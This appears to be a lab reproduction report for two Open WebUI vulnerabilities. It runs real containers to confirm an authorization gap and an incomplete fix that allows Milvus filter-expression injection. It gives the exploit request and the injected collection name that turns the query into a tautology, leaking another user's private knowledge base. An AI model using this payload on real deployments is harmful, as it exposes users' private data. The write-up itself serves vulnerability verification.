open-webui-cve-2026-54019 — REAL-APP reproduction (real Open WebUI + real Milvus over HTTP)
==========================================================================================
Pair: CVE-2026-44560 (missing authz, CWE-862) -> CVE-2026-54019 (incomplete fix; CWE-862 +
CWE-943 Milvus query-logic injection). GHSA-p5cp-r7rg-qpxc is explicitly "a bypass of the
earlier fix for GHSA-h36f-rqpx-j5wx / CVE-2026-44560". Same route + fix lineage, NOT
same-release (44560 fixed in 0.9.0; 54019 fixed in 0.9.6).

REBUILD NOTE (2026-07-17): the previous build LIFTED Open WebUI's RAG route / ACL /
milvus_multitenancy sink into a FastAPI harness under core/ (source-lift; BANNED). This
rebuild boots the REAL official Open WebUI image + a REAL Milvus standalone (multitenancy
mode) so Open WebUI's OWN retrieval/utils.py::filter_accessible_collections and
vector/dbs/milvus_multitenancy.py sink run inside the container. The attacker triggers the
missing-authorization RAG read over EXTERNAL HTTP. NO source is lifted.

Env: Docker Engine 29.4.0, Compose v5.1.2 (8 GB Docker RAM). Because 8 GB cannot host three
Milvus stacks at once, versions run SEQUENTIALLY (run_gate.sh): one real Milvus standalone
(milvusdb/milvus:v2.4.13 + etcd + minio) + one official Open WebUI image at a time, with a
fresh Milvus (`down -v`) between versions.

REAL software (official images, unmodified):
  V0 = ghcr.io/open-webui/open-webui:0.8.12  -> retrieval.py::_validate_collection_access only
        guards user-memory-*/file-* ; a plain KB uuid falls through -> NO authz (CVE-2026-44560)
  V1 = ghcr.io/open-webui/open-webui:0.9.0   -> filter_accessible_collections (44560 fix) blocks a
        KB the attacker doesn't own, BUT the else-branch allows an UNKNOWN non-KB name, which
        milvus_multitenancy.search() interpolates UNESCAPED into  expr=f"resource_id == '{id}'"  (TARGET)
  V2 = ghcr.io/open-webui/open-webui:0.9.6   -> _is_safe_collection_name regex ^[A-Za-z0-9_-]{1,255}$
        + _validate_resource_id at the sink (CVE-2026-54019 fix; negative control)

Vector store: REAL Milvus, ENABLE_MILVUS_MULTITENANCY_MODE=true, VECTOR_DB=milvus,
MILVUS_URI=http://milvus:19530. All KBs share the physical KNOWLEDGE_COLLECTION partitioned
by resource_id (= KB id). The tautology `resource_id != ''` matches every tenant's rows.
Embedding: Open WebUI built-in LOCAL sentence-transformers all-MiniLM-L6-v2 (RAG_EMBEDDING_ENGINE="")
downloaded once at boot into the container — OFFLINE, no external LLM/embedding API.

Canary = AUTHZ-SEEDED: a VICTIM (non-admin) owns a PRIVATE knowledge base whose uploaded chunk
carries ${PCB_FLAG}; the ATTACKER is a separate non-admin user. Users are provisioned over the
real API: first signup becomes admin (Open WebUI then auto-disables signup), admin creates
victim+attacker via POST /api/v1/auths/add (role=user), each granted
USER_PERMISSIONS_WORKSPACE_KNOWLEDGE_ACCESS. Victim uploads the flag doc via POST /api/v1/files/
and POST /api/v1/knowledge/{id}/file/add -> Open WebUI embeds it into Milvus under
resource_id=KB-id. Detection = ${PCB_FLAG} substring in the attacker's returned RAG documents.

EXTERNAL HTTP TRIGGER (attacker, real JWT bearer):
  POST http://127.0.0.1:39581/api/v1/retrieval/query/collection
  original (CVE-2026-44560): {"collection_names": ["<victim_kb_uuid>"], "query": "...", "k": 10}
  bypass   (CVE-2026-54019): {"collection_names": ["x' or resource_id != '' or resource_id == 'x"], ...}

RUN: PCB_FLAG=PCBFLAG_ea0047463c73451ab9e90f135ea302e1  (per-run authz canary)

OBSERVED (orchestrate.py; full JSON in results/v0.json, v1.json, v2.json):

  victim self-read (all versions)  -> HTTP 200, FLAG present   (real Milvus store holds the chunk)
  attacker baseline (own empty KB) -> HTTP 200, no flag         (benign control)

  original @ V0 (0.8.12)  collection_names=["<victim_kb>"]
     -> HTTP 200, FLAG present. No ACL on the query path -> attacker reads victim's private chunk.
  original @ V1 (0.9.0)   collection_names=["<victim_kb>"]
     -> HTTP 403 "Access prohibited". filter_accessible_collections: name IS a KB, attacker lacks
        access -> denied. (CVE-2026-44560 fixed.)
  bypass   @ V1 (0.9.0)   collection_names=["x' or resource_id != '' or resource_id == 'x"]
     -> HTTP 200, FLAG present (+ victim KB metadata chunk). Name is NOT a KB -> ACL else-branch
        allows it as legacy/ephemeral; unescaped expr becomes
        resource_id == 'x' or resource_id != '' or resource_id == 'x'  (tautology) over the shared
        KNOWLEDGE_COLLECTION -> cross-tenant leak of the victim's flag. (CVE-2026-54019 residual OPEN.)
  bypass   @ V2 (0.9.6)   same injection
     -> HTTP 403 "Access prohibited". _is_safe_collection_name rejects the quote/space chars before
        the sink (and _validate_resource_id would raise). (Residual CLOSED — negative control.)

4-WAY GATE (real-app HTTP):
  original_poc_reaches_flag_on_v0 : true   (200 + flag)
  original_poc_blocked_on_v1      : true   (403)
  bypass_poc_reaches_flag_on_v1   : true   (200 + flag)  <- TARGET
  residual_blocked_on_v2          : true   (403)         negative control
  => gate_passed.

VERDICT: gate_passed on REAL Open WebUI + REAL Milvus, external HTTP trigger, offline local
embedding, no source-lift. Incomplete-fix relationship confirmed from advisories + upstream diff.

TEARDOWN: OWUI_IMAGE=<img> docker compose down -v --rmi all ; docker rmi (openwebui/milvus/etcd/
minio) ; docker image prune -f. All project images removed, space reclaimed. Case dir TEXT only.

